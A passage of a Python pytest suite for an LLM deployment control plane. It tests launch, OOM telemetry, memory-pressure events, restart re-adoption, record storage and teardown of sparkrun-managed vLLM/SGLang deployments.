                fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
                served_name="model-%d" % i,
            )
            for i in range(8)
        ]
        for d in deployments:
            assert wait_for(
                lambda d=d: manager.get(d.deployment_id).state is S.READY
            )

        hanging["on"] = True
        start = time.monotonic()
        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
        manager.tick()
        for d in deployments:
            assert manager.get(d.deployment_id).state is S.READY  # one miss so far
        time.sleep(manager.poll_interval_s)
        manager.tick()
        elapsed = time.monotonic() - start

        for d in deployments:
            live = manager.get(d.deployment_id)
            assert live.state is S.FAILED, live.last_error
        assert elapsed <= 15.0, (
            "hanging probes across 8 watched deployments blew the 15s "
            "death bound: %.1fs" % elapsed
        )
        manager.close()
    finally:
        stop_accepting.set()
        acceptor.join(timeout=2.0)
        server.close()


def test_backend_dying_during_startup_fails_the_launch(tmp_path):
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    # The container disappears while the model is still loading.
    assert wait_for(lambda: manager.adapter.running)
    manager.adapter.running.clear()

    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.FAILED)
    assert "exited during startup" in manager.get(deployment.deployment_id).last_error
    manager.close()


def test_an_unanswering_check_job_does_not_instantly_fail_a_launch(tmp_path):
    """M-16: check-job returning unknown (e.g. it timed out on a wedged
    host) must not be read as "not running" -- that would kill a launch
    that may still be loading, exactly like test_backend_dying_during_
    startup_fails_the_launch above but for a host that never actually died.
    """
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    probe = FakeProbe(healthy_by_default=False)  # backend not answering yet
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.adapter.running)
    cluster_id = next(iter(adapter.running))
    adapter.unknown.add(cluster_id)  # check-job now times out for this cluster

    # Several ready-poll cycles all coming back "unknown": still LAUNCHING.
    time.sleep(0.05)
    assert manager.get(deployment.deployment_id).state is S.LAUNCHING

    # The host answers again and the backend finishes loading: it recovers,
    # proving the waiter kept going rather than having declared it dead.
    adapter.unknown.discard(cluster_id)
    probe.healthy_by_default = True
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    manager.close()


def test_launch_failure_preserves_raw_sparkrun_output(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(
        registry,
        recipe_dir=tmp_path / "recipes",
        fail_with=LaunchError(
            "sparkrun exited 0 but printed no cluster id; cannot track this workload",
            raw="sparkrun v0.2.40\nsomething unparseable happened\n",
        ),
    )
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.FAILED)
    error = manager.get(deployment.deployment_id).last_error
    assert "no cluster id" in error
    assert "something unparseable happened" in error
    manager.close()


def test_oom_signature_detection():
    assert is_oom("torch.OutOfMemoryError: CUDA out of memory. Tried to allocate")
    assert is_oom("Memory cgroup out of memory: Killed process 1234 (python)")
    assert is_oom("No available memory for the cache blocks")
    assert not is_oom("ValueError: unsupported dtype")


# ==========================================================================
# The calibration event: an OOM despite passing the fit gate.
# ==========================================================================


def test_oom_after_passing_the_fit_gate_emits_the_full_breakdown(tmp_path):
    """The most valuable telemetry the system produces. Agent D's estimate
    was low; the event carries the prediction next to the actual failure."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(
        registry,
        recipe_dir=tmp_path / "recipes",
        fail_with=LaunchError(
            "sparkrun exited 1",
            raw="torch.OutOfMemoryError: CUDA out of memory.",
            oom=True,
        ),
    )
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    fit = fx.fits()
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)
    assert wait_for(lambda: drain(manager.bus, ev.FIT_MISS))

    miss = drain(manager.bus, ev.FIT_MISS)[0]
    assert miss["deployment_id"] == deployment.deployment_id
    assert miss["predicted_verdict"] == fit.verdict.value
    assert miss["predicted_reason"] == fit.reason
    assert miss["predicted_total"] == fit.breakdown.total
    assert miss["usable_per_node"] == fit.usable_per_node
    assert miss["predicted_breakdown"]["weights"] == fit.breakdown.weights
    assert miss["predicted_breakdown"]["kv_cache"] == fit.breakdown.kv_cache
    assert "out of memory" in miss["actual_error"].lower()
    assert miss["plan"]["pipeline_parallel"] == 2
    assert miss["context_length"] == 65536
    manager.close()


# ==========================================================================
# Acceptance: crossing 95 percent memory emits a critical event that Agent G
# receives. And we shed, we do not kill.
# ==========================================================================


def test_ninety_percent_warns_and_degrades(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-02", 92.0)
    manager.tick()

    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    warnings = drain(manager.bus, ev.MEMORY_WARNING)
    assert warnings and warnings[0]["node_id"] == "spark-02"
    assert warnings[0]["severity"] == "warning"
    # DEGRADED still serves. Agent G keeps routing; it decides admission.
    assert warnings[0]["admitting"] is True
    manager.close()


def test_ninety_five_percent_emits_critical_and_stops_admission(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.5)
    manager.tick()

    critical = drain(manager.bus, ev.MEMORY_CRITICAL)
    assert len(critical) == 1
    assert critical[0]["deployment_id"] == deployment.deployment_id
    assert critical[0]["node_id"] == "spark-01"
    assert critical[0]["severity"] == "critical"
    # This is the field Agent G reads to stop admitting.
    assert critical[0]["admitting"] is False
    assert critical[0]["memory_used_pct"] == pytest.approx(96.5, abs=0.2)

    # Shed, never kill. The workload is untouched.
    assert manager.adapter.stops == []
    assert manager.adapter.running
    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    manager.close()


def test_critical_event_reaches_an_async_subscriber(tmp_path):
    """Agent G consumes this over `async for e in manager.events()`."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    async def consume():
        received: list[dict] = []

        async def reader():
            async for event in manager.events():
                received.append(event)
                if event["type"] == ev.MEMORY_CRITICAL:
                    return

        task = asyncio.create_task(reader())
        await asyncio.sleep(0.05)  # let the subscription register
        registry.set_memory_pct("spark-01", 97.0)
        await asyncio.to_thread(manager.tick)
        await asyncio.wait_for(task, timeout=5.0)
        return received

    received = asyncio.run(consume())
    critical = [e for e in received if e["type"] == ev.MEMORY_CRITICAL]
    assert critical and critical[0]["admitting"] is False
    manager.close()


def test_pressure_clearing_returns_to_ready(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.0)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.DEGRADED

    registry.set_memory_pct("spark-01", 40.0)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    cleared = drain(manager.bus, ev.MEMORY_CLEARED)
    assert cleared and cleared[0]["admitting"] is True
    manager.close()


def test_an_unhealthy_node_degrades_the_deployment(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_healthy("spark-02", False)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    assert drain(manager.bus, ev.NODE_UNHEALTHY)

    registry.set_healthy("spark-02", True)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    manager.close()


def test_memory_events_fire_on_change_not_every_tick(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.0)
    for _ in range(5):
        manager.tick()
    assert len(drain(manager.bus, ev.MEMORY_CRITICAL)) == 1
    manager.close()


def test_thresholds_are_the_documented_ones():
    assert ev.MEMORY_WARN_FRACTION == 0.90
    assert ev.MEMORY_CRITICAL_FRACTION == 0.95


# ==========================================================================
# Acceptance: restarting the control plane re-adopts a still-running
# deployment rather than orphaning or duplicating it.
# ==========================================================================


def test_restart_readopts_a_running_deployment(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live_clusters = set(first.adapter.running)
    first.close()

    # New process. Same volume, same still-running backend.
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = live_clusters
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    adopted = second.reconcile()

    assert [d.deployment_id for d in adopted] == [deployment.deployment_id]
    readopted = second.get(deployment.deployment_id)
    assert readopted.state is S.READY
    assert readopted.backend_url == deployment.backend_url
    assert readopted.plan.pipeline_parallel == 2
    assert readopted.fit.reason == deployment.fit.reason
    assert readopted.shape.model_id == fx.GPT_OSS_120B.model_id
    # Adopted, not relaunched.
    assert adapter.launches == []
    assert len(second.list()) == 1
    second.close()


def test_restart_retires_a_deployment_whose_backend_is_gone(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")  # nothing running
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path,
        probe_fn=FakeProbe(healthy_by_default=False), autostart=False,
    )
    adopted = second.reconcile()

    assert adopted == []
    retired = second.get(deployment.deployment_id)
    assert retired.state is S.STOPPED
    assert "gone" in retired.last_error
    second.close()


def test_restart_adopts_a_deployment_that_is_still_loading(tmp_path):
    """Container up, backend silent: it is mid-load, not dead. Adopt it as
    LAUNCHING so the gateway does not route to it, and finish waiting."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live = set(first.adapter.running)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = live
    probe = FakeProbe(healthy_by_default=False)
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()
    assert [d.state for d in adopted] == [S.LAUNCHING]

    probe.healthy_by_default = True  # the model finishes loading
    assert wait_for(lambda: second.get(deployment.deployment_id).state is S.READY)
    assert adapter.launches == []
    second.close()


def test_reconcile_does_not_retire_a_deployment_on_a_wedged_check_job(tmp_path):
    """M-16: check_job timing out on restart is 'sparkrun could not answer',
    not 'the workload is gone'. Collapsing that TIMEOUT into `running: False`
    used to make reconcile() retire a deployment that might still be alive
    on a wedged host -- it must instead adopt it as LAUNCHING, the same
    conservative outcome as backend-silent-but-container-up above."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live = set(first.adapter.running)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = set()  # sparkrun cannot confirm a live container either
    adapter.unknown = set(live)  # ...because check-job times out on this host
    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()

    assert [d.state for d in adopted] == [S.LAUNCHING]
    assert "could not confirm" in second.get(deployment.deployment_id).last_error

    probe.healthy_by_default = True  # the host answers again, model is up
    assert wait_for(lambda: second.get(deployment.deployment_id).state is S.READY)
    second.close()


def test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable(tmp_path):
    """M-16, the other check_job branch: `available()` being False (the
    sparkrun binary missing or unreachable from this process right now) is
    also 'we could not check', not 'the workload is gone'. Before this fix,
    check_job's early return hardcoded {"running": False} whenever
    available() was False, so a control plane that restarted into an
    environment temporarily missing the sparkrun binary would retire every
    live deployment it could not also confirm over HTTP -- the same failure
    mode as the wedged-check-job test above, reached through the other
    branch of check_job()."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    first.close()

    # A real SparkrunAdapter whose binary cannot be found -- available() is
    # False, exactly like test_check_job_survives_a_missing_sparkrun, now
    # exercised through reconcile() instead of a direct check_job() call.
    adapter = SparkrunAdapter(
        registry, recipe_dir=tmp_path / "recipes", binary="sparkrun-does-not-exist"
    )
    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()

    assert [d.state for d in adopted] == [S.LAUNCHING]
    assert "could not confirm" in second.get(deployment.deployment_id).last_error
    second.close()


def test_a_relaunch_of_the_same_model_on_the_same_nodes_is_refused(tmp_path):
    manager = make_manager(tmp_path)
    first = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert excinfo.value.existing.deployment_id == first.deployment_id
    assert len(manager.list()) == 1
    manager.close()


def test_planned_deployments_are_never_persisted(tmp_path):
    """Nothing was launched, so there is nothing to reconcile against."""
    store = DeploymentStore(tmp_path / "deployments")
    deployment = Deployment(
        "d-x", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.PLANNED, None, 4096, 8, None, None,
    )
    assert store.save(deployment) is None
    assert store.load_all() == []


def test_store_survives_a_corrupt_record(tmp_path):
    """One bad file must not stop the control plane from adopting the rest."""
    store = DeploymentStore(tmp_path / "deployments")
    good = Deployment(
        "d-good", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1.0, None,
    )
    store.save(good, {"cluster_id": "sparkrun_1"})
    (tmp_path / "deployments" / "d-bad.json").write_text("{ this is not json")
    loaded = store.load_all()
    assert [d.deployment_id for d, _ in loaded] == ["d-good"]


def test_store_roundtrips_every_contract_field(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    original = Deployment(
        "d-1", "gpt-oss-120b", fx.GPT_OSS_120B, fx.pp2_plan(), fx.wont_fit(), "sglang",
        S.DEGRADED, "http://h:8100/v1", 65536, 256, 1757193600.0, "some error",
    )
    store.save(original, {"cluster_id": "sparkrun_abc", "hosts": ["a", "b"], "port": 8100})
    (restored, handle), = store.load_all()
    assert restored == original
    assert restored.fit.reason == original.fit.reason
    assert restored.plan.rejected == original.plan.rejected
    assert handle["cluster_id"] == "sparkrun_abc"


def test_a_schema_v1_record_still_loads_after_modality_was_added(tmp_path):
    """Adding a contract field must not orphan what is already on disk.

    The codec is hand-written precisely so a contract change is noticed, but
    "noticed" has to mean a default, not a KeyError on every restart. A record
    written before modality existed was necessarily a text deployment, so the
    default is also the truth.
    """
    store = DeploymentStore(tmp_path / "deployments")
    current = Deployment(
        "d-1", "gpt-oss-120b", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1757193600.0, None,
    )
    path = store.save(current, {"port": 8100})

    # Rewrite it as v1: no modality key anywhere, which is exactly what the
    # previous build wrote.
    raw = json.loads(path.read_text())
    raw["schema_version"] = 1
    del raw["deployment"]["modality"]
    path.write_text(json.dumps(raw))

    (restored, _), = store.load_all()
    assert restored.modality is Modality.TEXT
    assert restored == current


def test_modality_survives_a_store_roundtrip(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    original = Deployment(
        "d-2", "kokoro", fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1757193600.0, None,
        modality=Modality.SPEECH,
    )
    store.save(original, {"port": 8100})
    (restored, _), = store.load_all()
    assert restored.modality is Modality.SPEECH


# ==========================================================================
# Low: FAILED/STOPPED records must not accumulate forever. purge_expired()
# is the terminal-record GC; reconcile() runs it once per restart.
# ==========================================================================


def test_purge_expired_removes_only_old_terminal_records(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    old_terminal = Deployment(
        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, "torn down",
    )
    fresh_terminal = Deployment(
        "d-fresh", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.FAILED, None, 4096, 8, None, "crashed",
    )
    still_live = Deployment(
        "d-live", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1.0, None,
    )
    old_path = store.save(old_terminal)
    store.save(fresh_terminal)
    store.save(still_live)
    old_time = time.time() - 8 * 24 * 3600  # past the default 7-day window
    os.utime(old_path, (old_time, old_time))

    removed = store.purge_expired(7 * 24 * 3600.0)

    assert removed == 1
    remaining = {d.deployment_id for d, _ in store.load_all()}
    assert remaining == {"d-fresh", "d-live"}


def test_purge_expired_leaves_a_terminal_record_inside_the_window(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    recent = Deployment(
        "d-recent", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, None,
    )
    store.save(recent)
    assert store.purge_expired(7 * 24 * 3600.0) == 0
    assert [d.deployment_id for d, _ in store.load_all()] == ["d-recent"]


def test_reconcile_garbage_collects_expired_terminal_records(tmp_path):
    """delete() had zero callers before this; reconcile() is now the one
    that gives it a job, once per restart, on the shipped retention window."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    store = DeploymentStore(tmp_path / "deployments")
    old_terminal = Deployment(
        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, "torn down",
    )
    old_path = store.save(old_terminal)
    old_time = time.time() - 8 * 24 * 3600
    os.utime(old_path, (old_time, old_time))

    manager = make_manager(tmp_path, registry=registry)
    manager.reconcile()

    assert manager.store.load_all() == []
    manager.close()


# ==========================================================================
# stop()
# ==========================================================================


def test_stop_tears_down_and_confirms(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.stop(deployment.deployment_id)
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    assert manager.adapter.stops
    assert not manager.adapter.running

    states = [(e["from"], e["to"]) for e in drain(manager.bus, ev.STATE_CHANGED)]
    assert ("ready", "stopping") in states and ("stopping", "stopped") in states
    manager.close()


def test_an_unconfirmed_stop_escalates_and_says_what_was_left_behind(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.adapter.stop_confirms = False
    manager.stop(deployment.deployment_id)

    live = manager.get(deployment.deployment_id)
    assert live.state is S.STOPPED
    assert "did not confirm" in live.last_error
    assert manager.adapter.launches[0]  # sanity
    escalations = drain(manager.bus, ev.STOP_ESCALATED)
    assert escalations
    assert escalations[0]["cluster_id"] in live.last_error
    assert fx.SPARK_01.address in escalations[0]["hosts"]
    manager.close()


def test_stopping_a_launch_in_flight_tears_it_down_rather_than_orphaning_it(tmp_path):
    """The lifecycle has no LAUNCHING -> STOPPING edge. Leaving the container
    running because the diagram has no arrow for it would orphan a workload."""
    probe = FakeProbe(healthy_by_default=False)  # never becomes ready
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.adapter.running)

    manager.stop(deployment.deployment_id)

    live = manager.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stop requested" in live.last_error
    assert manager.adapter.stops  # torn down, not orphaned
    assert not manager.adapter.running
    manager.close()


def test_stopping_an_unknown_deployment_raises(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(KeyError):
        manager.stop("d-nope")
    manager.close()


def test_stopping_twice_is_a_no_op(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    manager.stop(deployment.deployment_id)
    manager.stop(deployment.deployment_id)  # must not raise
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    manager.close()


# ==========================================================================
# Port allocation and identity
# ==========================================================================


def test_concurrent_deployments_get_distinct_ports(tmp_path):
    manager = make_manager(tmp_path)
    a = manager.launch(fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8)
    b = manager.launch(fx.QWEN3_30B_A3B, fx.single_node_plan("spark-02"), fx.fits(), "vllm", 8192, 8)
    assert wait_for(lambda: all(manager.get(d.deployment_id).state is S.READY for d in (a, b)))
    ports = {manager._records[d.deployment_id].handle["port"] for d in (a, b)}
    assert ports == {8100, 8101}
    manager.close()


def test_default_served_name_is_the_tail_of_the_model_id():
    assert default_served_name(fx.GPT_OSS_120B) == "gpt-oss-120b"
    assert default_served_name(fx.LLAMA_3_3_70B) == "Llama-3.3-70B-Instruct"


# ==========================================================================
# The event bus itself
# ==========================================================================


def test_a_slow_subscriber_drops_events_instead_of_stalling_the_producer():
    bus = EventBus()

    async def main():
        it = bus.subscribe()
        task = asyncio.create_task(it.__anext__())
        await asyncio.sleep(0)
        for i in range(2000):  # far past the queue bound
            bus.emit(ev.STATE_CHANGED, seq=i)
        assert await asyncio.wait_for(task, 2.0)
        await it.aclose()

    asyncio.run(main())
    assert len(bus.recent()) == 256  # the ring buffer, not unbounded


def test_unsubscribing_removes_the_subscriber():
    bus = EventBus()

    async def main():
        it = bus.subscribe()
        task = asyncio.create_task(it.__anext__())
        await asyncio.sleep(0)
        bus.emit(ev.STATE_CHANGED)
        await task
        assert bus.subscriber_count == 1
        await it.aclose()
        assert bus.subscriber_count == 0

    asyncio.run(main())


# ==========================================================================
# Day 0 stub. Agent G codes against this before sparkrun is wired.
# ==========================================================================


def test_both_managers_satisfy_the_port(tmp_path):
    assert isinstance(StubDeploymentManager(), DeploymentPort)
    assert isinstance(make_manager(tmp_path), DeploymentPort)


def test_stub_fakes_the_lifecycle_with_timers():
    stub = StubDeploymentManager(launch_seconds=0.2)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    assert deployment.backend_url == "http://127.0.0.1:8100/v1"
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)
    assert stub.get(deployment.deployment_id).started_at is not None
    stub.close()


def test_stub_default_launch_time_is_three_seconds():
    from control_plane.deploy.stub import LAUNCH_SECONDS

    assert LAUNCH_SECONDS == 3.0


def test_stub_drives_admission_for_agent_g():
    stub = StubDeploymentManager(launch_seconds=0.05)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)

    stub.simulate_memory(deployment.deployment_id, "spark-01", 96.0)
    assert stub.get(deployment.deployment_id).state is S.DEGRADED
    assert stub.admitting(deployment.deployment_id) is False
    critical = drain(stub.bus, ev.MEMORY_CRITICAL)
    assert critical and critical[0]["admitting"] is False

    stub.simulate_memory(deployment.deployment_id, "spark-01", 20.0)
    assert stub.get(deployment.deployment_id).state is S.READY
    assert stub.admitting(deployment.deployment_id) is True

    stub.simulate_backend_death(deployment.deployment_id, "killed for the demo")
    assert stub.get(deployment.deployment_id).state is S.FAILED
    assert stub.get(deployment.deployment_id).last_error == "killed for the demo"
    stub.close()


def test_stub_matches_the_real_manager_on_stopping_a_launch():
    stub = StubDeploymentManager(launch_seconds=30.0)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    stub.stop(deployment.deployment_id)
    live = stub.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stop requested" in live.last_error
    stub.close()


def test_stub_renders_the_real_command():
    """The UI must not be developed against a fictional command line."""
    stub = StubDeploymentManager()
    argv = stub.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert argv[:2] == ["sparkrun", "run"]
    assert "--pp" in argv
    stub.close()


def test_stub_enforces_the_same_fsm():
    stub = StubDeploymentManager(launch_seconds=0.05)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)
    stub.simulate_backend_death(deployment.deployment_id)
    record = stub._records[deployment.deployment_id]
    with pytest.raises(IllegalTransition):
        stub._transition(record, S.READY)
    assert stub.get(deployment.deployment_id).state is S.FAILED
    stub.close()


# ==========================================================================
# Real sparkrun. These are what "verified against real sparkrun flags" means.
# ==========================================================================


@needs_sparkrun
def test_the_rendered_command_is_accepted_by_real_sparkrun(tmp_path):
    """Render a PP=2 launch, write its recipe, and put it through sparkrun's
    own dry run. Exercises argument parsing and recipe validation for real."""
    adapter = SparkrunAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    recipe = adapter.recipe_for(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    materialize(recipe)
    argv = adapter.render_command(
        fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512, recipe=recipe
    )
    proc = subprocess.run(argv + ["--dry-run"], capture_output=True, text=True, timeout=180)
    assert proc.returncode == 0, proc.stdout + proc.stderr

    output = proc.stdout + proc.stderr
    # The planner's decision actually reached the serve command. This is the
    # assertion that catches a silently-dropped override.
    assert "--pipeline-parallel-size 2" in output
    assert "--tensor-parallel-size 1" in output
    assert "--max-model-len 65536" in output
    assert "--max-num-seqs 512" in output
    assert "--served-model-name gpt-oss-120b" in output
    assert "--port 8100" in output
    # And the handle we track it by is parseable out of the output.
    from control_plane.deploy.sparkrun import CLUSTER_ID_RE, HEAD_HOST_RE

    assert CLUSTER_ID_RE.search(output)
    assert HEAD_HOST_RE.search(output).group(1) == fx.SPARK_01.address


@needs_sparkrun
def test_synthesized_recipes_validate_for_every_runtime(tmp_path):
    for runtime in ("vllm", "sglang"):
        adapter = SparkrunAdapter(
            FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / runtime
        )
        recipe = adapter.recipe_for(fx.pp2_plan(), fx.GPT_OSS_120B, runtime, 32768, 256)
        path = materialize(recipe)
        proc = subprocess.run(
            ["sparkrun", "recipe", "validate", str(path)],
            capture_output=True, text=True, timeout=120,
        )
